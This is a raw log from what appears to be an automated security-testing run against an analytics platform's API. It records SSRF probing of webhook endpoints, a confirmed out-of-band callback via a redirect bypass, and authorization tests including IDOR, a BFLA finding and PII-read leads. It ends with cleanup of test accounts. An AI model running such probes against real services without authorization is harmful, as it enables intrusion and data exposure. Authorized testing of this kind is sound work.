[18:59:37] SSRF-TRIGGER: P3-trigger-execute POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/execute -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/execute"}
[18:59:38] SSRF-TRIGGER: P3-trigger-execute-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/execute -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/execute"}
[18:59:39] SSRF-TRIGGER: P3-trigger-send POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/send -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/send"}
[18:59:40] SSRF-TRIGGER: P3-trigger-send-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/send -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/send"}
[18:59:41] SSRF-TRIGGER: P3-trigger-preview POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/preview -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/preview"}
[18:59:43] SSRF-TRIGGER: P3-trigger-preview-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/preview -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/preview"}
[18:59:44] SSRF-TRIGGER: P3-trigger-sync POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync"}
[18:59:45] SSRF-TRIGGER: P3-trigger-sync-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync"}
[18:59:46] SSRF-TRIGGER: P3-trigger-sync_now POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync_now -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync_now"}
[18:59:47] SSRF-TRIGGER: P3-trigger-sync_now-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync_now -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/sync_now"}
[18:59:48] SSRF-TRIGGER: P3-trigger-dispatch POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/dispatch -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/dispatch"}
[18:59:48] SSRF-TRIGGER: P3-trigger-dispatch-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/dispatch -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/dispatch"}
[18:59:49] SSRF-TRIGGER: P3-trigger-replay POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/replay -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/replay"}
[18:59:50] SSRF-TRIGGER: P3-trigger-replay-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/replay -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/replay"}
[18:59:50] SSRF-TRIGGER: P3-trigger-invoke POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/invoke -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/invoke"}
[18:59:51] SSRF-TRIGGER: P3-trigger-invoke-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/invoke -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/invoke"}
[18:59:51] SSRF-TRIGGER: P3-trigger-flush POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/flush -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/flush"}
[18:59:52] SSRF-TRIGGER: P3-trigger-flush-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/flush -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/flush"}
[18:59:53] SSRF-TRIGGER: P3-trigger-deliver POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliver -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliver"}
[18:59:54] SSRF-TRIGGER: P3-trigger-deliver-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliver -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliver"}
[18:59:55] SSRF-TRIGGER: P3-trigger-call POST /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/call -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/call"}
[18:59:55] SSRF-TRIGGER: P3-trigger-call-GET GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/call -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/call"}
[18:59:55] SSRF-TRIGGER: === PHASE 4: delivery log probes ===
[18:59:57] ATTACK-SCIM: REPRO 1 POST -> 201 id=191160
[18:59:57] SSRF-TRIGGER: P4-log-deliveries GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliveries -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliveries"}
[18:59:57] SSRF-TRIGGER: P4-log-logs GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/logs -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/logs"}
[18:59:58] ATTACK-SCIM: REPRO 2 POST -> 201 id=191161
[18:59:58] SSRF-TRIGGER: P4-log-history GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/history -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/history"}
[18:59:59] SSRF-TRIGGER: P4-log-runs GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/runs -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/runs"}
[19:00:00] SSRF-TRIGGER: P4-log-events GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/events -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/events"}
[19:00:01] SSRF-TRIGGER: P4-log-attempts GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/attempts -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/attempts"}
[19:00:03] SSRF-TRIGGER: P4-log-calls GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/calls -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/calls"}
[19:00:04] ATTACK-SCIM: REPRO 3 POST -> 201 id=191162
[19:00:04] SSRF-TRIGGER: P4-log-requests GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/requests -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/requests"}
[19:00:05] SSRF-TRIGGER: P4-log-test_results GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/test_results -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/test_results"}
[19:00:06] SSRF-TRIGGER: P4-log-deliveries.json GET /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliveries.json -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa/deliveries.json"}
[19:00:06] SSRF-TRIGGER: === PHASE 5: cohort↔webhook attach + sync ===
[19:00:06] SSRF-TRIGGER: === PHASE 6: integrations API ===
[19:00:09] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations"}
[19:00:11] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations -> 405 | 
[19:00:11] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations/cohort_sync -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/cohort_sync"}
[19:00:12] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations/cohort_sync -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/cohort_sync"}
[19:00:12] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations/webhook -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook"}
[19:00:14] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations/webhook -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook"}
[19:00:14] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations/cohort_sync/run -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/cohort_sync/run"}
[19:00:18] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations/cohort_sync/run -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/cohort_sync/run"}
[19:00:19] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations/webhook/run -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook/run"}
[19:00:20] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations/webhook/run -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook/run"}
[19:00:21] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations/webhook/sync -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook/sync"}
[19:00:21] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations/webhook/sync -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook/sync"}
[19:00:22] SSRF-TRIGGER: P6-integ-POST POST /api/app/projects/4025923/integrations/webhook/test -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook/test"}
[19:00:22] SSRF-TRIGGER: P6-integ-GET GET /api/app/projects/4025923/integrations/webhook/test -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/integrations/webhook/test"}
[19:00:22] SSRF-TRIGGER: === PHASE 7: custom_alerts ===
[19:00:23] SSRF-TRIGGER: P7-custom_alerts-GET GET /api/app/projects/4025923/custom_alerts -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/custom_alerts"}
[19:00:23] SSRF-TRIGGER: P7-custom_alerts-POST POST /api/app/projects/4025923/custom_alerts -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/custom_alerts"}
[19:00:24] SSRF-TRIGGER: P7-alerts-GET GET /api/app/projects/4025923/alerts -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/alerts"}
[19:00:26] SSRF-TRIGGER: P7-alerts-POST POST /api/app/projects/4025923/alerts -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/alerts"}
[19:00:27] SSRF-TRIGGER: P7-notifications-GET GET /api/app/projects/4025923/notifications -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/notifications"}
[19:00:27] ATTACK-SCIM: NON-MEMBER POST IDOR -> 3100781 -> 403
[19:00:29] SSRF-TRIGGER: P7-notifications-POST POST /api/app/projects/4025923/notifications -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/notifications"}
[19:00:31] SSRF-TRIGGER: P7-webhooks-GET GET /api/app/projects/4025923/notifications/webhooks -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/notifications/webhooks"}
[19:00:32] SSRF-TRIGGER: P7-webhooks-POST POST /api/app/projects/4025923/notifications/webhooks -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/notifications/webhooks"}
[19:00:32] SSRF-TRIGGER: P7-exports-GET GET /api/app/projects/4025923/exports -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/exports"}
[19:00:34] SSRF-TRIGGER: P7-exports-POST POST /api/app/projects/4025923/exports -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/exports"}
[19:00:35] SSRF-TRIGGER: P7-data_pipelines-GET GET /api/app/projects/4025923/data_pipelines -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/data_pipelines"}
[19:00:35] SSRF-TRIGGER: P7-data_pipelines-POST POST /api/app/projects/4025923/data_pipelines -> 404 | {"status": "error", "error": "Not found: /api/app/projects/4025923/data_pipelines"}
[19:00:35] SSRF-TRIGGER: === PHASE 8: confirm OAST webhook fires via /test ===
[19:00:37] SSRF-TRIGGER: P8-test-direct-oast POST /api/app/projects/4025923/webhooks/test -> 200 | {"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[19:00:38] SSRF-TRIGGER: P8-test-by-id POST /api/app/projects/4025923/webhooks/test -> 400 | {"status": "error", "error": "root: Additional properties are not allowed (&#x27;webhook_id&#x27; was unexpected)&#x27;url&#x27; is a required propert
[19:00:38] SSRF-TRIGGER: === CLEANUP ===
[19:00:39] SSRF-TRIGGER: CLEAN-wh DELETE /api/app/projects/4025923/webhooks/91d8643b-2356-4a09-9735-ea2a4548d5fa -> 200 | {"status": "ok", "results": {"success": true}}
[19:00:39] SSRF-TRIGGER: Saved /home/hunter/new_agent/results/mixpanel/ssrf-trigger-1780160360.json entries=75
[19:01:43] SSRF-TRIGGER: === A: OPTIONS discovery on /webhooks ===
[19:01:43] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/app/projects/4025923/webhooks -> 405 Allow=GET, POST | 
[19:01:44] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/app/projects/4025923/webhooks -> 405 Allow=GET, POST | 
[19:01:45] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/app/projects/4025923/webhooks/test -> 405 Allow=POST | 
[19:01:45] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/app/projects/4025923/webhooks/test -> 405 Allow=POST | 
[19:01:46] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/app/projects/4025923/webhooks/test/ -> 405 Allow=POST | 
[19:01:46] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/app/projects/4025923/webhooks/test/ -> 405 Allow=POST | 
[19:01:47] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/2.0/cohorts/list?project_id=4025923 -> 200 Allow= [INTERESTING] | 
[19:01:48] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/2.0/cohorts/list?project_id=4025923 -> 400 Allow=GET, POST, OPTIONS [INTERESTING] | 
[19:01:48] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/2.0/cohorts/members?project_id=4025923 -> 200 Allow= [INTERESTING] | 
[19:01:49] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/2.0/cohorts/members?project_id=4025923 -> 400 Allow=GET, POST, OPTIONS [INTERESTING] | 
[19:01:50] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/2.0/cohorts?project_id=4025923 -> 200 Allow= [INTERESTING] | 
[19:01:50] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/2.0/cohorts?project_id=4025923 -> 400 Allow=GET, POST, OPTIONS [INTERESTING] | 
[19:01:51] SSRF-TRIGGER: A-OPTIONS ADMIN OPTIONS /api/app/projects/4025923/integrations -> 405 Allow=POST | 
[19:01:51] SSRF-TRIGGER: A-HEAD ADMIN HEAD /api/app/projects/4025923/integrations -> 405 Allow=POST | 
[19:01:51] SSRF-TRIGGER: === B: alternate webhook surfaces ===
[19:01:52] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/webhooks/test -> 405 Allow=POST | 
[19:01:52] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/cohort_sync -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_sync"}
[19:01:53] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/cohort_sync/webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_sync/webhooks"}
[19:01:54] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/cohort_sync/run -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_sync/run"}
[19:01:54] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/cohort_syncs -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/cohort_syncs"}
[19:01:55] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/sync -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/sync"}
[19:01:56] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/syncs -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/syncs"}
[19:01:56] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/destinations -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/destinations"}
[19:01:57] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/destinations/webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/destinations/webhooks"}
[19:01:57] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/data-pipelines -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/data-pipelines"}
[19:01:58] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/data-warehouse -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/data-warehouse"}
[19:01:59] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/connectors -> 200 Allow= [INTERESTING] | {"status": "ok", "results": {"url": null, "has_more": false, "data": []}}
[19:01:59] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/connections -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/connections"}
[19:01:59] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/jobs -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/jobs"}
[19:02:00] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/jobs/run -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/jobs/run"}
[19:02:00] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/tasks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/tasks"}
[19:02:01] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/triggers -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/triggers"}
[19:02:01] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/agent_webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/agent_webhooks"}
[19:02:02] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/lexicon/webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/lexicon/webhooks"}
[19:02:02] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/alerts/webhook -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/alerts/webhook"}
[19:02:03] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/cohort_sync -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/cohort_sync", "error": "project_id is a required parameter"}
[19:02:03] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/cohort-sync -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/cohort-sync", "error": "project_id is a required parameter"}
[19:02:04] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/cohort_sync/list?project_id=4025923 -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/cohort_sync/list?project_id=4025923", "error": "Invalid API endpoint"}
[19:02:04] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/cohort_sync/run?project_id=4025923 -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/cohort_sync/run?project_id=4025923", "error": "Invalid API endpoint"}
[19:02:05] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/cohorts/sync?project_id=4025923 -> 404 Allow= | {"request": "/api/2.0/cohorts/sync?project_id=4025923", "error": "Invalid endpoint: sync"}
[19:02:05] ATTACK-SCIM: SESSION COMPLETE. Findings: 1 (BFLA SA create, conf 0.92). Leads: 2 (org enum oracle, list-PII read-BFLA). All 18 test SAs deleted. Final state clean.
[19:02:05] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/cohorts/sync_now?project_id=4025923 -> 404 Allow= | {"request": "/api/2.0/cohorts/sync_now?project_id=4025923", "error": "Invalid endpoint: sync_now"}
[19:02:06] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/integrations?project_id=4025923 -> 404 Allow= | {"request": "/api/2.0/integrations?project_id=4025923", "error": "Invalid endpoint default"}
[19:02:06] SSRF-TRIGGER: B-GET ADMIN GET /api/2.0/destinations?project_id=4025923 -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/destinations?project_id=4025923", "error": "Invalid API endpoint"}
[19:02:07] SSRF-TRIGGER: B-GET ADMIN GET /api/app/projects/4025923/dashboards -> 200 Allow= [INTERESTING] | {"status": "ok", "results": [{"id": 11207838, "title": "\ud83c\udf31 Starter Board", "description": "This board contains
[19:02:07] SSRF-TRIGGER: === C: confirm OAST reaches via redirect-bypass ===
[19:02:08] SSRF-TRIGGER: C-redir-oast ADMIN POST /api/app/projects/4025923/webhooks/test -> 200 Allow= [INTERESTING] | {"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[19:02:08] SSRF-TRIGGER: === D: MEMBER role probes ===
[19:02:09] SSRF-TRIGGER: D-MEMBER-me ADMIN GET /api/app/me -> 200 Allow= [INTERESTING] | {"status": "ok", "results": {"date_joined_iso": "2026-05-19T14:21:11", "is_staff": false, "organizations": {"3100781": {
[19:02:09] SSRF-TRIGGER: MEMBER me parse error: Unterminated string starting at: line 1 column 280 (char 279)
[19:02:09] SSRF-TRIGGER: === E: /api/2.0 cohorts deeper probe ===
[19:02:09] SSRF-TRIGGER: E-2.0-/api/2.0/cohorts/list?project_id=4025923 ADMIN GET /api/2.0/cohorts/list?project_id=4025923 -> 200 Allow= [INTERESTING] | []
[19:02:12] SSRF-TRIGGER: E-2.0-/api/2.0/cohorts/list?project_id=4025923 ADMIN GET /api/2.0/cohorts/list?project_id=4025923&workspace_id=0 -> 403 Allow= [INTERESTING] | {"request": "/api/2.0/cohorts/list?project_id=4025923&workspace_id=0", "error": "Workspace does not belong to project"}
[19:02:12] SSRF-TRIGGER: E-2.0-/api/2.0/cohorts/list ADMIN GET /api/2.0/cohorts/list -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/cohorts/list", "error": "project_id is a required parameter"}
[19:02:13] SSRF-TRIGGER: E-2.0-POST-/api/2.0/cohorts ADMIN POST /api/2.0/cohorts -> 500 Allow= [INTERESTING] | {"request": "/api/2.0/cohorts", "error": "An unknown error occurred."}
[19:02:14] SSRF-TRIGGER: E-2.0-POST-/api/2.0/cohorts ADMIN POST /api/2.0/cohorts -> 500 Allow= [INTERESTING] | {"request": "/api/2.0/cohorts", "error": "An unknown error occurred."}
[19:02:14] SSRF-TRIGGER: E-2.0-POST-/api/2.0/cohorts?project_id=40 ADMIN POST /api/2.0/cohorts?project_id=4025923 -> 500 Allow= [INTERESTING] | {"request": "/api/2.0/cohorts?project_id=4025923", "error": "An unknown error occurred."}
[19:02:15] SSRF-TRIGGER: E-2.0-POST-/api/2.0/cohorts?project_id=40 ADMIN POST /api/2.0/cohorts?project_id=4025923 -> 500 Allow= [INTERESTING] | {"request": "/api/2.0/cohorts?project_id=4025923", "error": "An unknown error occurred."}
[19:02:15] SSRF-TRIGGER: === F: agent / MCP / agentic endpoints ===
[19:02:15] SSRF-TRIGGER: F-agent ADMIN GET /api/app/projects/4025923/agent -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/agent"}
[19:02:15] SSRF-TRIGGER: F-agents ADMIN GET /api/app/projects/4025923/agents -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/agents"}
[19:02:16] SSRF-TRIGGER: F-webhooks ADMIN GET /api/app/projects/4025923/agents/webhooks -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/agents/webhooks"}
[19:02:16] SSRF-TRIGGER: F-automations ADMIN GET /api/app/projects/4025923/automations -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/automations"}
[19:02:17] SSRF-TRIGGER: F-agentic_automations ADMIN GET /api/app/projects/4025923/agentic_automations -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/agentic_automations"}
[19:02:17] SSRF-TRIGGER: F-agent ADMIN GET /api/app/agent -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/agent"}
[19:02:18] SSRF-TRIGGER: F-agents ADMIN GET /api/app/agents -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/agents"}
[19:02:18] SSRF-TRIGGER: F-mcp ADMIN GET /api/app/mcp -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/mcp"}
[19:02:19] SSRF-TRIGGER: F-agent?project_id=4025923 ADMIN GET /api/2.0/agent?project_id=4025923 -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/agent?project_id=4025923", "error": "Invalid API endpoint"}
[19:02:19] SSRF-TRIGGER: F-agentic?project_id=4025923 ADMIN GET /api/2.0/agentic?project_id=4025923 -> 400 Allow= [INTERESTING] | {"request": "/api/2.0/agentic?project_id=4025923", "error": "Invalid API endpoint"}
[19:02:19] SSRF-TRIGGER: === G: webhook word fuzz on common segments ===
[19:02:20] SSRF-TRIGGER: G-webhook_url ADMIN GET /api/app/projects/4025923/webhook_url -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook_url"}
[19:02:20] SSRF-TRIGGER: G-webhooks_test ADMIN GET /api/app/projects/4025923/webhooks_test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks_test"}
[19:02:21] SSRF-TRIGGER: G-webhooks_test-POST ADMIN POST /api/app/projects/4025923/webhooks_test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhooks_test"}
[19:02:21] SSRF-TRIGGER: G-webhook-test ADMIN GET /api/app/projects/4025923/webhook-test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook-test"}
[19:02:22] SSRF-TRIGGER: G-webhook-test-POST ADMIN POST /api/app/projects/4025923/webhook-test -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook-test"}
[19:02:23] SSRF-TRIGGER: G-webhook/preview ADMIN GET /api/app/projects/4025923/webhook/preview -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook/preview"}
[19:02:23] SSRF-TRIGGER: G-webhook/dispatch ADMIN GET /api/app/projects/4025923/webhook/dispatch -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook/dispatch"}
[19:02:23] SSRF-TRIGGER: G-webhook-deliveries ADMIN GET /api/app/projects/4025923/webhook-deliveries -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook-deliveries"}
[19:02:24] SSRF-TRIGGER: G-webhook_deliveries ADMIN GET /api/app/projects/4025923/webhook_deliveries -> 404 Allow= | {"status": "error", "error": "Not found: /api/app/projects/4025923/webhook_deliveries"}
